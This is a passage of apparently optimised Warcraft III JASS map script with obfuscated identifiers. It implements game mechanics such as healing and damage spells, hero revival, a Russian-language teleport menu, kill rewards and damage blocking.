call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIre\\AIreTarget.mdl",NQ,"origin"))
if IsUnitAlly(NQ,GetOwningPlayer(Hu))==true then
set NS=I2R(3000+GetHeroInt(Hu,true)*2)*TQ[GetPlayerId(GetOwningPlayer(Hu))+1]
if GetUnitAbilityLevel(Hu,$42303743)>=1 and GetRandomInt(1,3)==1 then
call ng(Hu,Hu,"Double!",.028,0,255,0,50)
set NS=NS*2
endif
call SetUnitState(NQ,UNIT_STATE_LIFE,GetUnitState(NQ,UNIT_STATE_LIFE)+NS)
set Ht=GetUnitLoc(NQ)
set Na=CreateGroup()
set Vx=Condition(function mw)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),500,Vx)
set Nu=R2I(NS)
call ForGroup(Na,function m4)
call DestroyGroup(Na)
call DestroyBoolExpr(Vx)
call RemoveLocation(Ht)
set Ht=null
set Na=null
set Vx=null
else
set NS=I2R(4000+GetHeroInt(Hu,true)*5)*N0[GetPlayerId(GetOwningPlayer(Hu))+1]
if GetUnitAbilityLevel(GetTriggerUnit(),$42303743)>=1 and GetRandomInt(1,3)==1 then
call ng(Hu,Hu,"Double!",.028,0,255,0,50)
call UnitDamageTargetBJ(Hu,NQ,NS*2,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
set NS=I2R(6000+GetHeroInt(Hu,true)*4)*TQ[GetPlayerId(GetOwningPlayer(Hu))+1]
else
call UnitDamageTargetBJ(Hu,NQ,NS,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
set NS=I2R(3000+GetHeroInt(Hu,true)*2)*TQ[GetPlayerId(GetOwningPlayer(Hu))+1]
endif
set Ht=GetUnitLoc(NQ)
set Na=CreateGroup()
set Vx=Condition(function mw)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),500,Vx)
set Nu=R2I(NS)
call ForGroup(Na,function m4)
call DestroyGroup(Na)
call DestroyBoolExpr(Vx)
call RemoveLocation(Ht)
set Ht=null
set Na=null
set Vx=null
endif
elseif GetSpellAbilityId()==$41304435 then
set Ht=GetUnitLoc(Hu)
set NQ=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303739,Ht,GetUnitFacing(Hu))
call RemoveLocation(Ht)
set Ht=null
set Ht=GetSpellTargetLoc()
call SetUnitFacingToFaceLocTimed(NQ,Ht,0)
call AddSpecialEffectTarget("Abilities\\Spells\\Undead\\DarkSummoning\\DarkSummonMissile.mdl",NQ,"chest")
call SetUnitPathing(NQ,false)
call GroupClear(UN[GetPlayerId(GetOwningPlayer(Hu))])
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,NQ)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,Hu)
call SaveInteger(Nq,GetHandleId(Hc),2,80)
call TimerStart(Hc,.01,true,function zC)
set Hc=null
call RemoveLocation(Ht)
set Ht=null
endif
set NQ=null
set Hu=null
endfunction
function zF takes nothing returns nothing
set Xn=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Xn,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Xn,function zE)
endfunction
function zG takes nothing returns nothing
local unit Ne=GetTriggerUnit()
local location Ht=GetUnitLoc(Ne)
local location Nk
local integer L9
local integer Ma=GetPlayerId(GetOwningPlayer(Ne))
local real Mc
if GetSpellAbilityId()==$4131434E or GetSpellAbilityId()==$41314253 or GetSpellAbilityId()==$41304353 then
set Mc=800
set L9=0
loop
set Nk=GetUnitLoc(Xp[L9])
if DistanceBetweenPoints(Ht,Nk)<=800 then
call RemoveUnit(Xp[L9])
set Xp[L9]=null
if not UnitAlive(MT[L9]) then
call ReviveHero(MT[L9],GetLocationX(Nk),GetLocationY(Nk),false)
call SetUnitState(MT[L9],UNIT_STATE_LIFE,GetUnitState(MT[L9],UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(MT[L9],UNIT_STATE_MANA,GetUnitState(MT[L9],UNIT_STATE_MAX_MANA)*RMaxBJ(0,0)*.01)
endif
endif
set L9=L9+1
exitwhen L9>7
endloop
if RectContainsUnit(FL,Ne)==true then
set Xq[999]=Xq[999]+1
endif
if RectContainsUnit(GJ,Ne)==true then
set Xq[888]=Xq[888]+1
endif
endif
if GetSpellAbilityId()==$41304439 then
set Mc=800
set L9=0
loop
set Nk=GetUnitLoc(Xp[L9])
if DistanceBetweenPoints(Ht,Nk)<=800 then
call RemoveUnit(Xp[L9])
set Xp[L9]=null
if not UnitAlive(MT[L9]) then
call ReviveHero(MT[L9],GetLocationX(Nk),GetLocationY(Nk),false)
call SetUnitState(MT[L9],UNIT_STATE_LIFE,GetUnitState(MT[L9],UNIT_STATE_MAX_LIFE)*RMaxBJ(0,70)*.01)
call SetUnitState(MT[L9],UNIT_STATE_MANA,GetUnitState(MT[L9],UNIT_STATE_MAX_MANA)*RMaxBJ(0,70)*.01)
endif
endif
set L9=L9+1
exitwhen L9>7
endloop
if RectContainsUnit(FL,Ne)==true then
set Xq[999]=Xq[999]+1
endif
if RectContainsUnit(GJ,Ne)==true then
set Xq[888]=Xq[888]+1
endif
endif
if GetSpellAbilityId()==$41313341 then
set L9=0
loop
set Nk=GetUnitLoc(Xp[L9])
if DistanceBetweenPoints(Ht,Nk)<=800 then
call RemoveUnit(Xp[L9])
set Xp[L9]=null
if not UnitAlive(MT[L9]) then
call ReviveHero(MT[L9],GetLocationX(Nk),GetLocationY(Nk),false)
call SetUnitState(MT[L9],UNIT_STATE_LIFE,GetUnitState(MT[L9],UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(MT[L9],UNIT_STATE_MANA,GetUnitState(MT[L9],UNIT_STATE_MAX_MANA)*RMaxBJ(0,100)*.01)
endif
endif
set L9=L9+1
exitwhen L9>7
endloop
if RectContainsUnit(FL,Ne)==true then
set Xq[999]=Xq[999]+1
endif
if RectContainsUnit(GJ,Ne)==true then
set Xq[888]=Xq[888]+1
endif
if GetUnitTypeId(Ne)==$4830364E then
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\ArcaneExplosionRoz.mdx",Ht))
else
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\WaterEnchant.mdx",Ht))
endif
endif
if GetSpellAbilityId()==$41304730 or GetSpellAbilityId()==$41304733 then
set L9=0
loop
set Nk=GetUnitLoc(Xp[L9])
if DistanceBetweenPoints(Ht,Nk)<=900 then
call RemoveUnit(Xp[L9])
set Xp[L9]=null
if not UnitAlive(MT[L9]) then
call ReviveHero(MT[L9],GetLocationX(Nk),GetLocationY(Nk),false)
call SetUnitState(MT[L9],UNIT_STATE_LIFE,GetUnitState(MT[L9],UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(MT[L9],UNIT_STATE_MANA,GetUnitState(MT[L9],UNIT_STATE_MAX_MANA)*RMaxBJ(0,100)*.01)
endif
endif
set L9=L9+1
exitwhen L9>7
endloop
if RectContainsUnit(FL,Ne)==true then
set Xq[999]=Xq[999]+1
endif
if RectContainsUnit(GJ,Ne)==true then
set Xq[888]=Xq[888]+1
endif
endif
if GetSpellAbilityId()==$41305552 or GetSpellAbilityId()==$41313953 then
set L9=0
loop
set Nk=GetUnitLoc(Xp[L9])
if DistanceBetweenPoints(Ht,Nk)<=800 then
call RemoveUnit(Xp[L9])
set Xp[L9]=null
if not UnitAlive(MT[L9]) then
call ReviveHero(MT[L9],GetLocationX(Nk),GetLocationY(Nk),false)
call SetUnitState(MT[L9],UNIT_STATE_LIFE,GetUnitState(MT[L9],UNIT_STATE_MAX_LIFE)*RMaxBJ(0,100)*.01)
call SetUnitState(MT[L9],UNIT_STATE_MANA,GetUnitState(MT[L9],UNIT_STATE_MAX_MANA)*RMaxBJ(0,100)*.01)
endif
endif
set L9=L9+1
exitwhen L9>7
endloop
if RectContainsUnit(FL,Ne)==true then
set Xq[999]=Xq[999]+1
endif
if RectContainsUnit(GJ,Ne)==true then
set Xq[888]=Xq[888]+1
endif
endif
set Ne=null
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
endfunction
function zH takes nothing returns nothing
local trigger Xo=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Xo,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Xo,function zG)
set Xo=null
endfunction
function zI takes nothing returns nothing
local location Mc
if GetIssuedOrderId()==String2OrderIdBJ("attack") and GetOwningPlayer(GetOrderTargetUnit())!=Player(PLAYER_NEUTRAL_PASSIVE) and IsUnitAlly(GetOrderTargetUnit(),GetOwningPlayer(GetTriggerUnit()))==true then
set Mc=GetUnitLoc(GetTriggerUnit())
call IssuePointOrderLoc(GetTriggerUnit(),"move",Mc)
call RemoveLocation(Mc)
set Mc=null
endif
endfunction
function zJ takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddAction(Hc,function zI)
set Hc=null
endfunction
function zK takes nothing returns nothing
local location Ht
if GetClickedButton()==Xs[21] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=13 and IsUnitAliveBJ(H8)==true then
set Ht=Location(-12170.,-24100.)
endif
elseif GetClickedButton()==Xs[22] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=17 and IsUnitAliveBJ(H3)==true then
set Ht=Location(-10440.,-24100.)
endif
elseif GetClickedButton()==Xs[23] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=25 and IsUnitAliveBJ(IC)==true then
set Ht=Location(-8580.,-24000.)
endif
elseif GetClickedButton()==Xs[24] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=30 and IsUnitAliveBJ(IG)==true then
set Ht=Location(-6666.,-24000.)
endif
elseif GetClickedButton()==Xs[25] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=38 and IsUnitAliveBJ(Hv)==true then
set Ht=Location(-4920.,-24000.)
endif
elseif GetClickedButton()==Xs[26] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=45 and IsUnitAliveBJ(H5)==true then
set Ht=Location(-2870.,-24000.)
endif
elseif GetClickedButton()==Xs[27] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=50 and IsUnitAliveBJ(IJ)==true then
set Ht=Location(-840.,-24000.)
endif
elseif GetClickedButton()==Xs[9] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=22 then
set Ht=Location(1718.,5224.)
endif
elseif GetClickedButton()==Xs[8] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=52 then
set Ht=Location(18939,1505)
endif
elseif GetClickedButton()==Xs[5] then
set Ht=GetRectCenter(BH)
elseif GetClickedButton()==Xs[4] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=39 then
set Ht=Location(5470,320)
endif
elseif GetClickedButton()==Xs[3] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=25 then
set Ht=Location(-5350,4383)
endif
elseif GetClickedButton()==Xs[2] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=20 then
set Ht=Location(2740.,-4473.)
endif
elseif GetClickedButton()==Xs[1] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=5 then
set Ht=Location(-10600,-5000)
endif
elseif GetClickedButton()==Xs[6] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=29 then
set Ht=Location(-4900,12870)
endif
elseif GetClickedButton()==Xs[7] then
if GetUnitLevel(MT[GetPlayerId(GetTriggerPlayer())])>=25 then
set Ht=GetRectCenter(F7)
endif
endif
call SetUnitPositionLoc(MT[GetPlayerId(GetTriggerPlayer())],Ht)
if GetLocalPlayer()==GetTriggerPlayer() then
call PanCameraToTimed(GetLocationX(Ht),GetLocationY(Ht),0)
endif
call RemoveLocation(Ht)
set Ht=null
endfunction
function zL takes nothing returns nothing
if IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true then
call DialogDisplay(GetOwningPlayer(GetTriggerUnit()),Xr[2],true)
endif
endfunction
function zM takes nothing returns nothing
if IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true then
call DialogDisplay(GetOwningPlayer(GetTriggerUnit()),Xr[1],true)
endif
endfunction
function zN takes nothing returns nothing
local trigger Xt
local trigger Xu
set Xr[1]=DialogCreate()
set Xr[2]=DialogCreate()
set Xs[5]=DialogAddButton(Xr[1],"|c00ffff00Суральд|r",0)
set Xs[1]=DialogAddButton(Xr[1],"|c0000ff00Лес Долорес|r (|c007d7d7d5 уровень|r)",1)
set Xs[2]=DialogAddButton(Xr[1],"|c00ff0000Терасса Творцов|r (|c007d7d7d20 уровень|r)",2)
set Xs[9]=DialogAddButton(Xr[1],"|cFF0080FFДжунгли Тайпан|r (|c007d7d7d22 уровень|r)",8)
set Xs[3]=DialogAddButton(Xr[1],"|c007d7d7dСтарое Кладбище|r (|c007d7d7d25 уровень|r)",3)
set Xs[7]=DialogAddButton(Xr[1],"|c0000ffffЗимняя Долина|r (|c007d7d7d25 уровень|r)",4)
set Xs[6]=DialogAddButton(Xr[1],"|c006969ffАрхипелаг|r (|c007d7d7d29 уровень|r)",5)
set Xs[4]=DialogAddButton(Xr[1],"|c00ff9696Орхест|r (|c007d7d7d39 уровень|r)",6)
set Xs[8]=DialogAddButton(Xr[1],"|c00ff7f00Пустошь|r (|c007d7d7d52 уровень|r)",7)
call DialogAddButton(Xr[1],"Отмена",8)
set Xs[21]=DialogAddButton(Xr[2],"|c00ff7f00Люк|r (|c007d7d7d13 уровень|r)",1)
set Xs[22]=DialogAddButton(Xr[2],"|c00ff7f00Каменный Гигант|r (|c007d7d7d17 уровень|r)",2)
set Xs[23]=DialogAddButton(Xr[2],"|c00ff7f00Айс|r (|c007d7d7d25 уровень|r)",3)
set Xs[24]=DialogAddButton(Xr[2],"|c00ff7f00Детерок|r (|c007d7d7d30 уровень|r)",4)
set Xs[25]=DialogAddButton(Xr[2],"|c00ff7f00Визирь|r (|c007d7d7d38 уровень|r)",5)
set Xs[26]=DialogAddButton(Xr[2],"|c00ff7f00Мамонт|r (|c007d7d7d45 уровень|r)",6)
set Xs[27]=DialogAddButton(Xr[2],"|c00ff7f00Акнорт|r (|c007d7d7d50 уровень|r)",7)
set Xs[28]=DialogAddButton(Xr[2],"Отмена",7)
set Xt=CreateTrigger()
call TriggerRegisterDialogEventBJ(Xt,Xr[1])
call TriggerRegisterDialogEventBJ(Xt,Xr[2])
call TriggerAddAction(Xt,function zK)
set Xu=CreateTrigger()
call TriggerRegisterEnterRectSimple(Xu,BG)
call TriggerRegisterEnterRectSimple(Xu,CW)
call TriggerRegisterEnterRectSimple(Xu,BJ)
call TriggerRegisterEnterRectSimple(Xu,BK)
call TriggerRegisterEnterRectSimple(Xu,BI)
call TriggerRegisterEnterRectSimple(Xu,BT)
call TriggerRegisterEnterRectSimple(Xu,Dm)
call TriggerRegisterEnterRectSimple(Xu,GT)
call TriggerRegisterEnterRectSimple(Xu,Dl)
call TriggerAddAction(Xu,function zM)
set Xu=null
set Xu=CreateTrigger()
call TriggerRegisterEnterRectSimple(Xu,CZ)
call TriggerAddAction(Xu,function zL)
set Xu=null
set Xt=null
endfunction
function zO takes nothing returns boolean
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
if not (IsUnitIllusion(GetTriggerUnit())==false) then
return false
endif
if not (GetUnitTypeId(GetTriggerUnit())!=$756C6F63) then
return false
endif
if not (GetUnitTypeId(GetTriggerUnit())!=$75303036) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$416C6F63)<1) then
return false
endif
if not (GetUnitTypeId(GetTriggerUnit())!=$6E676772) then
return false
endif
return true
endfunction
function zP takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function zQ takes nothing returns boolean
if not (GetItemCharges(GetItemOfTypeFromUnitBJ(GetEnumUnit(),$6F66726F))>=35) then
return false
endif
return true
endfunction
function zR takes nothing returns nothing
call SetItemCharges(GetItemOfTypeFromUnitBJ(GetEnumUnit(),$6F66726F),GetItemCharges(GetItemOfTypeFromUnitBJ(GetEnumUnit(),$6F66726F))+1)
if zQ() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnumUnit(),$6F66726F))
call UnitAddItemByIdSwapped($49304C36,GetEnumUnit())
else
endif
endfunction
function zS takes nothing returns nothing
local location Xw=GetUnitLoc(GetTriggerUnit())
local group Xx=GetUnitsInRangeOfLocMatching(1000.,Xw,Condition(function zP))
call ForGroupBJ(Xx,function zR)
call DestroyGroup(Xx)
call RemoveLocation(Xw)
set Xx=null
set Xw=null
endfunction
function zT takes nothing returns nothing
set Xv=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Xv,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(Xv,Condition(function zO))
call TriggerAddAction(Xv,function zS)
endfunction
function zU takes nothing returns nothing
local unit X1=GetEnumUnit()
call AddHeroXP(X1,UE[2],false)
call ne(X1,"+"+I2S(R2I(UE[2]))+"EXP",.025,255,50,255)
set X1=null
endfunction
function zV takes nothing returns boolean
if IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true then
if IsUnitIllusion(GetFilterUnit())==false then
if GetUnitLevel(GetFilterUnit())>=UE[0] then
if GetUnitLevel(GetFilterUnit())<=UE[1] then
return true
endif
endif
endif
endif
return false
endfunction
function zW takes nothing returns nothing
local unit Hu=GetEnumUnit()
if nO(Hu,$4930554F) or nO(Hu,$49305553) or nO(Hu,$49305551) or nO(Hu,$49304E45) or nO(Hu,$49304E49) or nO(Hu,$49304E4A) or nO(Hu,$49304E48) or nO(Hu,$49304E47) or nO(Hu,$4930304C) or nO(Hu,$49304739) or nO(Hu,$49304E43) or nO(Hu,$49304E44) or nO(Hu,$49304E46) then
if GetRandomInt(1,10)==1 then
set Xz=Xz+Xz/5
endif
endif
set NJ[GetPlayerId(GetOwningPlayer(Hu))+1]=NJ[GetPlayerId(GetOwningPlayer(Hu))+1]+Xz*3
call ng(Hu,Hu,"+"+I2S(Xz)+"G",.023,255,255,0,100)
if nO(Hu,$4930554F) or nO(Hu,$49305553) or nO(Hu,$49305551) or nO(Hu,$49304E45) or nO(Hu,$49304E49) or nO(Hu,$49304E4A) or nO(Hu,$49304E48) or nO(Hu,$49304E47) then
if GetRandomInt(1,50)==1 then
set NK[GetPlayerId(GetOwningPlayer(Hu))+1]=NK[GetPlayerId(GetOwningPlayer(Hu))+1]+X0*3
call ng(Hu,Hu,"+"+I2S(X0)+"Blood!",.023,255,0,255,100)
endif
endif
set Hu=null
endfunction
function zX takes nothing returns nothing
local unit Ud=GetTriggerUnit()
local location Ht=GetUnitLoc(Ud)
local integer U4=GetUnitLevel(Ud)
local group Mc
local boolexpr No
local integer Np
local real Nt
set Xz=U4
set X0=U4
if GetOwningPlayer(Ud)==Player(PLAYER_NEUTRAL_AGGRESSIVE) then
if U4==1 then
set UE[0]=1
set UE[1]=12
set Mc=CreateGroup()
set No=Condition(function zV)
call GroupEnumUnitsInRange(Mc,GetLocationX(Ht),GetLocationY(Ht),800,No)
call DestroyBoolExpr(No)
set Np=CountUnitsInGroup(Mc)
set UE[2]=11+2*Np
call ForGroup(Mc,function zU)
call DestroyGroup(Mc)
set No=null
set Mc=null
elseif U4==2 then
set UE[0]=13
set UE[1]=16
set Mc=CreateGroup()
set No=Condition(function zV)
call GroupEnumUnitsInRange(Mc,GetLocationX(Ht),GetLocationY(Ht),800,No)
call DestroyBoolExpr(No)
set Np=CountUnitsInGroup(Mc)
set UE[2]=18+3*Np
call ForGroup(Mc,function zU)
call DestroyGroup(Mc)
set No=null
set Mc=null
elseif U4==3 then
set UE[0]=17
set UE[1]=21
set Mc=CreateGroup()
set No=Condition(function zV)
call GroupEnumUnitsInRange(Mc,GetLocationX(Ht),GetLocationY(Ht),800,No)
call DestroyBoolExpr(No)
set Np=CountUnitsInGroup(Mc)
set UE[2]=28+5*Np
call ForGroup(Mc,function zU)
call DestroyGroup(Mc)
set No=null
set Mc=null
elseif U4==4 or U4==5 then
set UE[0]=22
set UE[1]=24
set Mc=CreateGroup()
set No=Condition(function zV)
call GroupEnumUnitsInRange(Mc,GetLocationX(Ht),GetLocationY(Ht),800,No)
call DestroyBoolExpr(No)
set Np=CountUnitsInGroup(Mc)
set UE[2]=34+6*Np
call ForGroup(Mc,function zU)
call DestroyGroup(Mc)
set No=null
set Mc=null
elseif U4==6 then
set UE[0]=25
set UE[1]=28
set Mc=CreateGroup()
set No=Condition(function zV)
call GroupEnumUnitsInRange(Mc,GetLocationX(Ht),GetLocationY(Ht),800,No)
call DestroyBoolExpr(No)
set Np=CountUnitsInGroup(Mc)
set UE[2]=40+7*Np
call ForGroup(Mc,function zU)
call DestroyGroup(Mc)
set No=null
set Mc=null
elseif U4==7 then
set UE[0]=29
set UE[1]=38
set Mc=CreateGroup()
set No=Condition(function zV)
call GroupEnumUnitsInRange(Mc,GetLocationX(Ht),GetLocationY(Ht),800,No)
call DestroyBoolExpr(No)
set Np=CountUnitsInGroup(Mc)
set UE[2]=47+9*Np
call ForGroup(Mc,function zU)
call DestroyGroup(Mc)
set No=null
set Mc=null
elseif U4==8 then
set UE[0]=39
set UE[1]=41
set Nt=800.
set Mc=CreateGroup()
set No=Condition(function zV)
call GroupEnumUnitsInRange(Mc,GetLocationX(Ht),GetLocationY(Ht),800,No)
call DestroyBoolExpr(No)
set Np=CountUnitsInGroup(Mc)
set UE[2]=60+11*Np
call ForGroup(Mc,function zU)
call DestroyGroup(Mc)
set No=null
set Mc=null
elseif U4==9 then
set UE[0]=42
set UE[1]=45
set Mc=CreateGroup()
set No=Condition(function zV)
call GroupEnumUnitsInRange(Mc,GetLocationX(Ht),GetLocationY(Ht),800,No)
call DestroyBoolExpr(No)
set Np=CountUnitsInGroup(Mc)
set UE[2]=63+11*Np
call ForGroup(Mc,function zU)
call DestroyGroup(Mc)
set No=null
set Mc=null
elseif U4==10 then
set UE[0]=45
set UE[1]=49
set Mc=CreateGroup()
set No=Condition(function zV)
call GroupEnumUnitsInRange(Mc,GetLocationX(Ht),GetLocationY(Ht),800,No)
call DestroyBoolExpr(No)
set Np=CountUnitsInGroup(Mc)
set UE[2]=70+12*Np
call ForGroup(Mc,function zU)
call DestroyGroup(Mc)
set No=null
set Mc=null
endif
if GetUnitAbilityLevel(Ud,$41305858)>=1 then
set Xz=Xz+U4*35
endif
set Mc=CreateGroup()
set No=Condition(function mv)
call GroupEnumUnitsInRange(Mc,GetLocationX(Ht),GetLocationY(Ht),800,No)
call DestroyBoolExpr(No)
call ForGroup(Mc,function zW)
call DestroyGroup(Mc)
set No=null
set Mc=null
endif
call RemoveLocation(Ht)
set Ht=null
set Ud=null
endfunction
function zY takes nothing returns nothing
local trigger Xy=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Xy,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(Xy,function zX)
set Xy=null
endfunction
function zZ takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),$41305043)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function za takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local real NS=GetEventDamage()
local real X3
local real L9
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
local integer Nj=R2I(NS)
local location Mc
local unit No
local timer Np
if GetUnitAbilityLevel(Hu,$42505345)>0 then
if nO(Hu,$75666C67) or nO(Hu,$6E666C67) or nO(Hu,$6F666C67) or nO(Hu,$73686377) then
call UnitRemoveAbility(Hu,$42505345)
endif
endif
if GetUnitAbilityLevel(Hu,$41304438)>0 and GetRandomInt(1,10)==1 then
set X3=I2R(GetUnitAbilityLevel(Hu,$41304438))*70
if NS>=X3 then
call SetUnitState(Hu,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(Hu,UNIT_STATE_LIFE)+X3))
call ne(Hu,"Block!",.022,10,10,10)
else
call SetUnitState(Hu,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(Hu,UNIT_STATE_LIFE)+NS))
call ne(Hu,"Block!",.022,10,10,10)
endif
endif
if GetUnitAbilityLevel(Hu,$42303737)>0 then
if GetUnitAbilityLevel(Hu,$42303134)>0 then
set L9=I2R(GetUnitAbilityLevel(Hu,$41304144))*.15
set X3=NS*L9
call SetUnitState(Hu,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(Hu,UNIT_STATE_LIFE)+X3))
endif
if GetUnitAbilityLevel(Hu,$41303030)>0 or GetUnitAbilityLevel(Hu,$41304652)>0 then
if GetRandomInt(1,10)==1 then
set X3=I2R(GetUnitAbilityLevel(Hu,$41303030)*120+GetHeroStr(Hu,true)+GetHeroInt(Hu,true))/4
if nO(Hu,$49303948) or nO(Hu,$49303950) then
set X3=X3+200
elseif nO(Hu,$7373616E) or nO(Hu,$49304A59) then
set X3=X3+300
elseif nO(Hu,$49304D57) or nO(Hu,$49305744) then
set X3=X3+600
endif
if NS>=X3 then
call SetUnitState(Hu,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(Hu,UNIT_STATE_LIFE)+X3))
call ne(Hu,"Block! ("+I2S(R2I(X3))+")",.023,255,100,100)
else
call SetUnitState(Hu,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(Hu,UNIT_STATE_LIFE)+NS))
call ne(Hu,"Block! ("+I2S(R2I(NS))+")",.023,255,100,100)
endif
endif
endif
elseif GetUnitAbilityLevel(Hu,$42303141)>0 and GetRandomInt(1,3)==1 then
set X3=NS*(14+I2R(GetUnitAbilityLevel(Hu,$41303934)))/100
call SetUnitState(Hu,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(Hu,UNIT_STATE_LIFE)+X3))
call ne(Hu,"Block! ("+I2S(R2I(X3))+")",.023,255,100,100)
elseif GetUnitAbilityLevel(Hu,$4230384F)>0 and Pp[Ma]==true then
if Po[Ma]>0 then
if Nj<Po[Ma] then
set Po[Ma]=Po[Ma]-Nj
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)+I2R(Nj))
call ne(Hu,"Щит: "+I2S(Po[Ma])+"!",.023,255,100,100)
else
set Pp[Ma]=false
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)+I2R(Po[Ma]))
call ne(Hu,"Щит: "+I2S(Po[Ma])+"!",.023,255,100,100)
set Po[Ma]=0
call UnitRemoveAbility(Hu,$4230384F)
endif
else
set Pp[Ma]=false
set Po[Ma]=0
call UnitRemoveAbility(Hu,$4230384F)
endif
elseif GetUnitAbilityLevel(Hu,$4130584B)>0 and GetUnitAbilityLevel(Hu,$41313436)>=1 then
if GetUnitAbilityLevel(Hu,$41313148)>=1 then
set X3=NS/3
else
set X3=NS/2
endif
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)+X3)
call ne(Hu,"Block: "+I2S(R2I(X3))+"!",.023,0,255,255)
elseif GetUnitAbilityLevel(Hu,$41313155)>=1 and GetUnitAbilityLevel(Hu,$41313436)>=1 and GetRandomInt(1,10)==1 then
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)+NS)
call ne(Hu,"Block!",.03,255,0,255)
elseif GetUnitAbilityLevel(Hu,$42303248)>=1 and GetUnitAbilityLevel(Hu,$4131334C)>=1 and GetUnitAbilityLevel(GetEventDamageSource(),$416C6F63)==0 and not IsUnitType(GetEventDamageSource(),UNIT_TYPE_MAGIC_IMMUNE) then
if GetUnitAbilityLevel(GetEventDamageSource(),$42303639)==0 then
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\SpellShieldAmulet\\SpellShieldCaster.mdl",Hu,"chest"))
set Mc=GetUnitLoc(GetEventDamageSource())
set No=CreateUnitAtLoc(Player(0),$68303739,Mc,0)
call nD(No,1)
call UnitAddAbility(No,$4131324E)
call IssueTargetOrder(No,"creepthunderbolt",GetEventDamageSource())
call RemoveLocation(Mc)
set Mc=null
set X3=I2R(200*GetUnitAbilityLevel(Hu,$4131334C)+GetHeroStr(Hu,true)*5)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
call m0(No,GetEventDamageSource(),R2I(X3))
set No=null
endif
endif
if GetUnitAbilityLevel(Hu,$42303248)>=1 then
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)+NS)
endif
if GetUnitAbilityLevel(Hu,$42303236)>=1 then
set X3=NS/10+I2R(GetUnitAbilityLevel(Hu,$42303236)*25)
if X3>NS then
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)+NS)
else
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)+X3)
endif
endif
if nO(Hu,$72756D70) and GetUnitAbilityLevel(GetEventDamageSource(),$416C6F63)==0 then
if GetUnitAbilityLevel(Hu,$41305043)==0 then
call UnitAddAbility(Hu,$41305043)
set X3=GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true)
call m1(Hu,GetEventDamageSource(),R2I(X3))
elseif GetUnitAbilityLevel(Hu,$41305043)==1 then
